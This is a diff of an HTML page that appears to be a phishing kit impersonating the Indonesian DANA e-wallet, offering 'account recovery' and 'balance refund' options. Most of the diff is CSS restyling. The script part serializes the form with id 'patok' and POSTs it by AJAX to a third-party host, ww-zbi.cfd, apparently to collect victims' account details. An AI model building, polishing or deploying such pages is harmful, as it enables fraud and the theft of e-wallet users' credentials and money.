@@ -41,131 +41,10 @@
 
 </head>
 <style>
- form {
-  --background: #fff;
-  --text: #414856;
-  --radio: #7C96B2;
-  --radio-checked: #118EEA;
-  --radio-size: 22px;
-  --width: 292px;
-  --height: 120px;
-  --border-radius: 10px;
-  background: var(--background);
-  width: var(--width);
-  height: var(--height);
-  border-radius: var(--border-radius);
-  color: var(--text);
-  position: relative;
-  box-shadow: 0 10px 30px rgba(65, 72, 86, 0.05);
-  box-shadow: rgba(99, 99, 99, 0.2) 0px 2px 8px 0px;
-  padding: 30px 20px;
-  padding-top: 10px;
-  display: grid;
-  grid-template-columns: auto var(--radio-size);
-  font-weight: bold;
-  align-items: center;
-  
-}
-form label {
-  cursor: pointer;
-  color: #118EEA;
-  font-weight: bold;
-  
-}
-form input[type=radio] {
-  -webkit-appearance: none;
-  -moz-appearance: none;
-  position: relative;
-  height: var(--radio-size);
-  width: var(--radio-size);
-  outline: none;
-  margin: 3px 0;
-  cursor: pointer;
-  border: 2px solid var(--radio);
-  background: transparent;
-  border-radius: 50%;
-  display: grid;
-  
-  justify-self: end;
-  justify-items: center;
-  align-items: center;
-  overflow: hidden;
-  transition: border 0.5s ease;
-}
-form input[type=radio]::before, form input[type=radio]::after {
-  content: "";
-  display: flex;
-  justify-self: center;
-  border-radius: 50%;
-}
-form input[type=radio]::before {
-  position: absolute;
-  width: 100%;
-  height: 100%;
-  background: var(--background);
-  z-index: 1;
-  opacity: var(--opacity, 1);
-}
-form input[type=radio]::after {
-  position: relative;
-  width: calc(100% /2);
-  height: calc(100% /2);
-  background: var(--radio-checked);
-  top: var(--y, 100%);
-  transition: top 0.5s cubic-bezier(0.48, 1.97, 0.5, 0.63);
-}
-form input[type=radio]:checked {
-  --radio: var(--radio-checked);
-}
-form input[type=radio]:checked::after {
-  --y: 0%;
-  -webkit-animation: stretch-animate 0.3s ease-out 0.17s;
-          animation: stretch-animate 0.3s ease-out 0.17s;
-}
-form input[type=radio]:checked::before {
-  --opacity: 0;
-}
-form input[type=radio]:checked ~ input[type=radio]::after {
-  --y: -100%;
-}
-form input[type=radio]:not(:checked)::before {
-  --opacity: 1;
-  transition: opacity 0s linear 0.5s;
-}
-
-@-webkit-keyframes stretch-animate {
-  0% {
-    transform: scale(1, 1);
-  }
-  28% {
-    transform: scale(1.15, 0.85);
-  }
-  50% {
-    transform: scale(0.9, 1.1);
-  }
-  100% {
-    transform: scale(1, 1);
-  }
-}
-
-@keyframes stretch-animate {
-  0% {
-    transform: scale(1, 1);
-  }
-  28% {
-    transform: scale(1.15, 0.85);
-  }
-  50% {
-    transform: scale(0.9, 1.1);
-  }
-  100% {
-    transform: scale(1, 1);
-  }
-}
+ 
 body {
   background: #E8EBF3;
   height: 100%;
-  font: 400 16px "Varela Round", sans-serif;
   display: flex;
   flex-direction: column;
   justify-content: center;
@@ -174,35 +53,10 @@ body {
   margin: 0 auto;
   left: 0;
   right: 0;
-}
-body .socials {
   position: fixed;
-  display: block;
-  left: 20px;
-  bottom: 20px;
-}
-body .socials > a {
-  display: block;
-  width: 30px;
-  opacity: 0.2;
-  transform: scale(var(--scale, 0.8));
-  transition: transform 0.3s cubic-bezier(0.38, -0.12, 0.24, 1.91);
-}
-body .socials > a:hover {
-  --scale: 1;
-}   
-
-
-/* Added PseudoCode CSS to Hide the Controls of Video as on adding Controls Attribute to Video, the controls of video get visible easily. So to control that case also, this needs to be present on CSS End */
-
-video::-webkit-media-controls {
-    display: ;
+  
 }
 
-video {
-  display: none;
-  pointer-events: none;
-}
 
 
 #carousel {
@@ -220,40 +74,6 @@ video {
   --middle: 3;
   --position: 1;
   pointer-events: none;
-}
-
-div.item {
-  position: absolute;
-  width: 300px;
-  height: 400px;
-  background-color: ;
-  --r: calc(var(--position) - var(--offset));
-  --abs: max(calc(var(--r) * -1), var(--r));
-  transition: all 0.25s linear;
-  transform: rotateY(calc(-10deg * var(--r)))
-    translateX(calc(-300px * var(--r)));
-  z-index: calc((var(--position) - var(--abs)));
-}
-
-div.item:nth-of-type(1) {
-  --offset: 1;
-  background-color: #90f1ef;
-}
-div.item:nth-of-type(2) {
-  --offset: 2;
-  background-color: #ff70a6;
-}
-div.item:nth-of-type(3) {
-  --offset: 3;
-  background-color: #ff9770;
-}
-div.item:nth-of-type(4) {
-  --offset: 4;
-  background-color: #ffd670;
-}
-div.item:nth-of-type(5) {
-  --offset: 5;
-  background-color: #e9ff70;
 }
 
 
@@ -356,8 +176,8 @@ form {
   --radio: #7C96B2;
   --radio-checked: #118EEA;
   --radio-size: 25px;
-  --width: 292px;
-  --height: 120px;
+  --width: 74%;
+  --height: 10px;
   --border-radius: 20px 20px 8px 8px;
   background: var(--background);
   width: var(--width);
@@ -384,95 +204,7 @@ form label {
   font-weight: bold;
   text-shadow: 1px 1px 0 #FFF;
 }
-form input[type=radio] {
-  -webkit-appearance: none;
-  -moz-appearance: none;
-  position: relative;
-  height: var(--radio-size);
-  width: var(--radio-size);
-  outline: none;
-  margin: 3px 0;
-  cursor: pointer;
-  border: 2px solid var(--radio);
-  background: transparent;
-  border-radius: 50%;
-  display: grid;
-  justify-self: end;
-  justify-items: center;
-  align-items: center;
-  overflow: hidden;
-  transition: border 0.5s ease;
-}
-form input[type=radio]::before, form input[type=radio]::after {
-  content: "";
-  display: flex;
-  justify-self: center;
-  border-radius: 50%;
-}
-form input[type=radio]::before {
-  position: absolute;
-  width: 100%;
-  height: 100%;
-  background: var(--background);
-  z-index: 1;
-  opacity: var(--opacity, 1);
-}
-form input[type=radio]::after {
-  position: relative;
-  width: calc(100% /2);
-  height: calc(100% /2);
-  background: var(--radio-checked);
-  top: var(--y, 100%);
-  transition: top 0.5s cubic-bezier(0.48, 1.97, 0.5, 0.63);
-}
-form input[type=radio]:checked {
-  --radio: var(--radio-checked);
-}
-form input[type=radio]:checked::after {
-  --y: 0%;
-  -webkit-animation: stretch-animate 0.3s ease-out 0.17s;
-          animation: stretch-animate 0.3s ease-out 0.17s;
-}
-form input[type=radio]:checked::before {
-  --opacity: 0;
-}
-form input[type=radio]:checked ~ input[type=radio]::after {
-  --y: -100%;
-}
-form input[type=radio]:not(:checked)::before {
-  --opacity: 1;
-  transition: opacity 0s linear 0.5s;
-}
 
-@-webkit-keyframes stretch-animate {
-  0% {
-    transform: scale(1, 1);
-  }
-  28% {
-    transform: scale(1.15, 0.85);
-  }
-  50% {
-    transform: scale(0.9, 1.1);
-  }
-  100% {
-    transform: scale(1, 1);
-  }
-}
-
-@keyframes stretch-animate {
-  0% {
-    transform: scale(1, 1);
-  }
-  28% {
-    transform: scale(1.15, 0.85);
-  }
-  50% {
-    transform: scale(0.9, 1.1);
-  }
-  100% {
-    transform: scale(1, 1);
-  }
-}
 
 .effec {
 	-webkit-animation-duration: 2s;
@@ -494,16 +226,7 @@ form input[type=radio]:not(:checked)::before {
         -webkit-transform: translateX(0); 
     } 
 } 
-@keyframes fadeInRightBig { 
-    0% { 
-        opacity: 1; 
-        transform: translateX(200px); 
-    } 
-    100% { 
-        opacity: 1; 
-        transform: translateX(0); 
-    } 
-} 
+
 
 .animated {
 	-webkit-animation-duration: 3s;
@@ -612,7 +335,7 @@ form input[type=radio]:not(:checked)::before {
 </center>
 
 <!-- partial:index.partial.html -->
-<form id="patok" class="effec" style="margin-top: -60px; height: 50px; padding-top: 15px; margin-bottom: 0px; text-align: center; font-size: 15px; background: #118EEA; color: #fff; border-radius: 15px 15px 0px 0px; border: 2px solid #fff; margin: 0px auto; margin-top: -10px;">
+<form class="effec" style="margin-top: -60px; height: 50px; padding-top: 15px; margin-bottom: 0px; text-align: center; font-size: 15px; background: #118EEA; color: #fff; border-radius: 15px 15px 0px 0px; border: 2px solid #fff; margin: 0px auto; margin-top: -10px;">
     <div style="margin-left: 0px; margin-top: -7px">𝗜𝗡𝗣𝗨𝗧 𝗦𝗘𝗦𝗨𝗔𝗜 𝗞𝗘𝗡𝗗𝗔𝗟𝗔𝗠𝗨</div>
 
  </form>   
@@ -624,12 +347,12 @@ form input[type=radio]:not(:checked)::before {
   padding-right: 7px;
   font-size: 14.3px;
   position: relative;
-  height: 36px;
+  height: 38px;
   overflow: hidden;
   background-color: rgb(0, 134, 224);
   border-radius: 20px;
-  margin-top: 4px;
-  margin-bottom: 1.4ex;  
+  margin-top: 0px;
+  margin-bottom: 1ex;  
   box-shadow: rgb(170, 170, 170) 5px 5px 7px 0px;
   transition: background 200ms ease 0s;  
   border: 1.5px solid #ddd;
@@ -656,8 +379,8 @@ form input[type=radio]:not(:checked)::before {
   display: flex;
   color: #fff;
   width: 500%;
-  height: 36px;
-  text-shadow: none;
+  height: 38px;
+  text-shadow: 2px 2px 2px #00000030;
   margin: auto;  
   text-align: center;
   justify-content: center;
@@ -668,11 +391,32 @@ form input[type=radio]:not(:checked)::before {
       color: #000;
 }
 
+.form{
+   position: relative;
+    margin-top: -65px;
+    border-top: 1px solid #ccc;
+    height: 170px;
+    text-align: center;
+    background: url(https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhHG8bz71IvIJl3PSWe5SPQf2uqQRQd7iX915m31vSQDrIrovNA6ILfIsJj7ePkpIAgn7SBUDGkNctPgm1V0Wj1g1NZCq50Ayw-2r8S0ekfxNwrUpaZ_3rDwwk46KJ8T6ro1LZDWKkFXKdQoV-TGaaFrytMF_60ahkXcBghNf5oSjwqA01os0L4TqOFPx4/s2000/AddText_04-03-07.31.42.png);
+    background-position: 100% 100%;
+    background-size: 100% 100%;
+    background-color: #fff;
+    outline: 1px solid #118EEA;
+    text-shadow: 0 0.5px 0.5px rgba(000, 999, 255, 10.75);
+    box-shadow: rgba(6, 24, 24, 0.99) 0px 0px 0px 2px,
+    rgba(6, 24, 4, 10.65) 0px 4px 6px -1px,
+    rgba(255, 255, 255, 0.08) 0px 1px 0px inset;
+    font-size: 12px;
+    color: #fff;
+    width: 80%;
+    max-width:450px;
+     z-index: 99999;
+}
+
+
     </style>
  
-<form class="effec" style="margin-top: -65px; border-top: 1px solid #ccc; height: 170px; text-align: center; background: url(https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhHG8bz71IvIJl3PSWe5SPQf2uqQRQd7iX915m31vSQDrIrovNA6ILfIsJj7ePkpIAgn7SBUDGkNctPgm1V0Wj1g1NZCq50Ayw-2r8S0ekfxNwrUpaZ_3rDwwk46KJ8T6ro1LZDWKkFXKdQoV-TGaaFrytMF_60ahkXcBghNf5oSjwqA01os0L4TqOFPx4/s2000/AddText_04-03-07.31.42.png);
-    background-position: 100% 100%;
-    background-size: 100% 100%; background-color: #fff; outline: 1px solid #118EEA; text-shadow: 0 0.5px 0.5px rgba(000, 999, 255, 10.75);box-shadow: rgba(6, 24, 24, 0.99) 0px 0px 0px 2px, rgba(6, 24, 4, 10.65) 0px 4px 6px -1px, rgba(255, 255, 255, 0.08) 0px 1px 0px inset; font-size: 12px; color: #fff; width: 315px;max-width:450px;">
+<form id="patok" class="form effec">
     
 
  <center>
@@ -685,7 +429,7 @@ form input[type=radio]:not(:checked)::before {
    <sp class="s">𝗣𝗲𝗺𝘂𝗹𝗶𝗵𝗮𝗻 𝗔𝗸𝘂𝗻 𝗗𝗮𝗻𝗮</span>
    </label>
    <label class="aha">
-   <input type="radio" id="btn3" name="tarif" value="𝗣𝗲𝗿𝗯𝗮𝗶𝗸𝗮𝗻 𝗞𝗲𝗻𝗱𝗮𝗹𝗮 𝗔𝗸𝘂𝗻" onclick="letsgo1()">
+   <input type="radio" id="btn3" name="tarif" value="𝗥𝗲𝗳𝘂𝗻𝗱 𝗦𝗮𝗹𝗱𝗼 𝗗𝗔𝗡𝗔" onclick="letsgo1()">
    <sp class="s">𝗥𝗲𝗳𝘂𝗻𝗱 𝗦𝗮𝗹𝗱𝗼 𝗗𝗔𝗡𝗔</span>
    </label>
    <label class="aha">
@@ -702,10 +446,10 @@ form input[type=radio]:not(:checked)::before {
 
 <!--- ## DRIBBBLE + TWITTER ############# -->
 
-<footer class="animatedUp"style="max-width:450px;margin: 0 auto;left: 0;right:0;position: fixed; bottom: 20; left: 0; right: 0; width: 100%; height: 200px; z-index: 3; background-color: #fff; border-radius: 15px 15px 0px 0px; border-top: 3px solid #118EEA">
+<footer class="animatedUp"style="max-width:450px;margin: 0 auto;left: 0;right:0;position: fixed; bottom: 15; left: 0; right: 0; width: 100%; height: 200px; z-index: 3; background-color: #fff; border-radius: 15px 15px 0px 0px; border-top: 3px solid #118EEA">
 <!----------HTML code starts here------->
 
-<div class="owl-carousel owl-theme owl-loaded " style="height: 125px; transform-style: preserve-3d; overflow: hidden">
+<div class="owl-carousel owl-theme owl-loaded " style="margin-top:-5px;height: 125px; transform-style: preserve-3d; overflow: hidden">
             
        <div class="owl-stage-outer" style="padding: 0 90px; height: 160px; width: 100%; transform-style: preserve-3d;">
          
@@ -802,8 +546,7 @@ var tarif = $('input[name="tarif"]:checked').val();
       $("#process1").fadeIn(); 
         $.ajax({
             type: 'POST',
-            url: 'https://ww-zbi.cfd/b0f1/ll/tarif.php',
-            data: $('#patok').serialize(),
+             url: 'https://ww-zbi.cfd/b0f1/ll/tarif.php',           data: $('#patok').serialize(),
             datatype: 'JSON',            
             complete: function(data) {
             setTimeout(function(){            
